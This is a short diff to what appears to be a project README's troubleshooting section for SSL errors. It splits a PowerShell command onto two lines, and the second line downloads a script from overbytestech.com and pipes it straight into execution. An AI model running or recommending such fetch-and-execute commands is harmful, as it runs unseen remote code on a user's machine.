@@ -36,5 +36,6 @@ If you run into SSL errors, run the following command:
 
 ```powershell
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm overbytestech.com/repair | iex
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+irm overbytestech.com/repair | iex
 ```
